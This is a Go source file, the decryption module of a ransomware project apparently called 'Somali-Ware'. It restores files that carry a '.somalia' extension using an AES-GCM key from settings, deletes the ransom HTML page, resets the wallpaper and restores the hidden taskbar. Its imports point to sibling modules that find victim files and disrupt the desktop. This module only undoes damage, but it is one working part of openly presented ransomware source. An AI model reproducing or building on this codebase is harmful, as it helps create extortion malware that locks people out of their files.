package decryption

import (
	"Somali-Ware/modules/annoying/background"
	"Somali-Ware/modules/annoying/taskbar"
	"Somali-Ware/modules/assoc"
	"Somali-Ware/modules/cache"
	"Somali-Ware/modules/finder"
	"Somali-Ware/settings"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
	"io"
	"os"
	"strings"
	"sync"
	"time"
)

const workerCount = 50

func StartDecryption() {
	err := os.Remove(assoc.GetHtmlFilePath())
	if err != nil {
		fmt.Println(err)
	}

	if !settings.Testing {
		go background.ResetWallpaper()
		go taskbar.ShowTaskBar()
	}

	var wg sync.WaitGroup
	startTime := time.Now()
	done := make(chan struct{})

	// start the finder for decryption
	wg.Add(1)
	go func() {
		defer wg.Done()
		finder.Finder(true)
	}()

	// start the decrypter
	wg.Add(1)
	go func() {
		defer wg.Done()
		decrypter(done)
	}()

	// cache monitor
	go cache.MonitorCache(done)

	wg.Wait()

	endTime := time.Now()
	duration := endTime.Sub(startTime)
	fmt.Println(cache.FilesFound, "files decrypted")
	fmt.Printf("Decryption completed in %s\n", duration)
}

func decrypter(done <-chan struct{}) {
	filesToDecrypt := make(chan string, workerCount*2)

	var wg sync.WaitGroup
	for i := 0; i < workerCount; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			worker(filesToDecrypt)
		}()
	}

	go func() {
		defer close(filesToDecrypt)
		for {
			processFilesToDecrypt(filesToDecrypt)
			select {
			case <-done:
				return
			default:
				time.Sleep(1 * time.Second)
			}
		}
	}()

	wg.Wait()
}

func processFilesToDecrypt(filesToDecrypt chan<- string) {
	cache.CacheMutex.Lock()
	defer cache.CacheMutex.Unlock()

	for len(cache.Cache) > 0 {
		filePath := cache.Cache[0]
		cache.Cache = cache.Cache[1:]
		filesToDecrypt <- filePath
	}
}

func worker(filesToDecrypt <-chan string) {
	block, err := aes.NewCipher(settings.Key)
	if err != nil {
		fmt.Printf("Error creating cipher block: %v\n", err)
		return
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		fmt.Printf("Error creating GCM: %v\n", err)
		return
	}

	for filePath := range filesToDecrypt {
		err := decryptFile(filePath, gcm)
		if err != nil {
			fmt.Printf("Error decrypting file %s: %v\n", filePath, err)
		}
		cache.FilesFound++
	}
}

func decryptFile(filePath string, gcm cipher.AEAD) error {
	file, err := os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to open file: %w", err)
	}
	defer file.Close()

	nonceSize := gcm.NonceSize()
	fileInfo, err := file.Stat()
	if err != nil {
		return fmt.Errorf("failed to stat file: %w", err)
	}

	if fileInfo.Size() < int64(nonceSize) {
		return fmt.Errorf("file too short")
	}

	nonce := make([]byte, nonceSize)
	if _, err := io.ReadFull(file, nonce); err != nil {
		return fmt.Errorf("failed to read nonce: %w", err)
	}

	ciphertext, err := io.ReadAll(file)
	if err != nil {
		return fmt.Errorf("failed to read ciphertext: %w", err)
	}

	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return fmt.Errorf("failed to decrypt data: %w", err)
	}

	// Ensure file is closed before writing the decrypted content
	file.Close()

	decryptedFilePath := strings.TrimSuffix(filePath, ".somalia")
	if err := os.WriteFile(decryptedFilePath, plaintext, 0644); err != nil {
		return fmt.Errorf("failed to write decrypted file: %w", err)
	}

	file, err = os.Open(decryptedFilePath)
	if err != nil {
		return fmt.Errorf("failed to reopen file: %w", err)
	}
	defer file.Close()

	if strings.HasSuffix(decryptedFilePath, ".ini") && strings.Contains(decryptedFilePath, "Desktop") {
		err := os.Chmod(decryptedFilePath, 0644)
		if err != nil {
			return fmt.Errorf("failed to set hidden attribute: %w", err)
		}
	}

	// Reopen the file to ensure it's closed properly
	file, err = os.Open(filePath)
	if err != nil {
		return fmt.Errorf("failed to reopen file: %w", err)
	}
	file.Close()

	if err := os.Remove(filePath); err != nil {
		return fmt.Errorf("failed to remove encrypted file: %w", err)
	}

	return nil
}
